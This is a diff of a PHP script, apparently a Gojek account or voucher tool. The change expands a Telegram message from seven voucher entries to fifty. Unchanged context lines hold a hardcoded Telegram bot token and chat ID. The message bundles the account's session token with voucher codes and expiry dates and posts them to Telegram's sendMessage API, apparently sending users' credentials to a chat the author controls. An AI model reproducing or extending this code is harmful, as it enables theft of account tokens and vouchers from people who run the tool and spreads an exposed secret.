@@ -287,7 +287,21 @@ echo color("green"," =================================== \n");
 				
 				$TOKEN  = "1032900146:AAE7V93cvCvw1DNuTk0Hp1ZFywJGmjiP7aQ";
 				$chatid = "785784404";
-				$pesan 	= "[+] Gojek Account Info [+]\n\n".$token."\n\nTotalVoucher = ".$total."\n[+] ".$voucher1."\n[+] Exp : [".$expired1."]\n[+] ".$voucher2."\n[+] Exp : [".$expired2."]\n[+] ".$voucher3."\n[+] Exp : [".$expired3."]\n[+] ".$voucher4."\n[+] Exp : [".$expired4."]\n[+] ".$voucher5."\n[+] Exp : [".$expired5."]\n[+] ".$voucher6."\n[+] Exp : [".$expired6."]\n[+] ".$voucher7."\n[+] Exp : [".$expired7."]";
+				$pesan 	= "[+] Gojek Account Info [+]\n\n".$token."\n\nTotalVoucher = ".$total."\n[+]
+				".$voucher1."\n[+] Exp : [".$expired1."]\n[+] ".$voucher2."\n[+] Exp : [".$expired2."]\n[+] ".$voucher3."\n[+] Exp : [".$expired3."]\n[+] ".$voucher4."\n[+] Exp : [".$expired4."]\n[+] ".$voucher5."\n[+] Exp : [".$expired5."]\n[+]
+				".$voucher6."\n[+] Exp : [".$expired6."]\n[+] ".$voucher7."\n[+] Exp : [".$expired7."]\n[+] ".$voucher8."\n[+] Exp : [".$expired8."]\n[+] ".$voucher9."\n[+] Exp : [".$expired9."]\n[+] ".$voucher10."\n[+] Exp : [".$expired10."]\n[+]
+				
+				".$voucher11."\n[+] Exp : [".$expired11."]\n[+] ".$voucher12."\n[+] Exp : [".$expired12."]\n[+] ".$voucher13."\n[+] Exp : [".$expired13."]\n[+] ".$voucher14."\n[+] Exp : [".$expired14."]\n[+] ".$voucher15."\n[+] Exp : [".$expired15."]\n[+]
+				".$voucher16."\n[+] Exp : [".$expired16."]\n[+] ".$voucher17."\n[+] Exp : [".$expired17."]\n[+] ".$voucher18."\n[+] Exp : [".$expired18."]\n[+] ".$voucher19."\n[+] Exp : [".$expired19."]\n[+] ".$voucher20."\n[+] Exp : [".$expired20."]\n[+]
+				
+				".$voucher21."\n[+] Exp : [".$expired21."]\n[+] ".$voucher22."\n[+] Exp : [".$expired22."]\n[+] ".$voucher23."\n[+] Exp : [".$expired23."]\n[+] ".$voucher24."\n[+] Exp : [".$expired24."]\n[+] ".$voucher25."\n[+] Exp : [".$expired25."]\n[+]
+				".$voucher26."\n[+] Exp : [".$expired26."]\n[+] ".$voucher27."\n[+] Exp : [".$expired27."]\n[+] ".$voucher28."\n[+] Exp : [".$expired28."]\n[+] ".$voucher29."\n[+] Exp : [".$expired29."]\n[+] ".$voucher30."\n[+] Exp : [".$expired30."]\n[+]
+				
+				".$voucher31."\n[+] Exp : [".$expired31."]\n[+] ".$voucher32."\n[+] Exp : [".$expired32."]\n[+] ".$voucher33."\n[+] Exp : [".$expired33."]\n[+] ".$voucher34."\n[+] Exp : [".$expired34."]\n[+] ".$voucher35."\n[+] Exp : [".$expired35."]\n[+]
+				".$voucher36."\n[+] Exp : [".$expired36."]\n[+] ".$voucher37."\n[+] Exp : [".$expired37."]\n[+] ".$voucher38."\n[+] Exp : [".$expired38."]\n[+] ".$voucher39."\n[+] Exp : [".$expired39."]\n[+] ".$voucher40."\n[+] Exp : [".$expired40."]\n[+]
+				
+				".$voucher41."\n[+] Exp : [".$expired41."]\n[+] ".$voucher42."\n[+] Exp : [".$expired42."]\n[+] ".$voucher43."\n[+] Exp : [".$expired43."]\n[+] ".$voucher44."\n[+] Exp : [".$expired44."]\n[+] ".$voucher45."\n[+] Exp : [".$expired45."]\n[+]
+				".$voucher46."\n[+] Exp : [".$expired46."]\n[+] ".$voucher47."\n[+] Exp : [".$expired47."]\n[+] ".$voucher48."\n[+] Exp : [".$expired48."]\n[+] ".$voucher49."\n[+] Exp : [".$expired49."]\n[+] ".$voucher50."\n[+] Exp : [".$expired50."]";
 				$method	= "sendMessage";
 				$url    = "https://api.telegram.org/bot" . $TOKEN . "/". $method;
 				$post = ['chat_id' => $chatid, 'text' => $pesan];
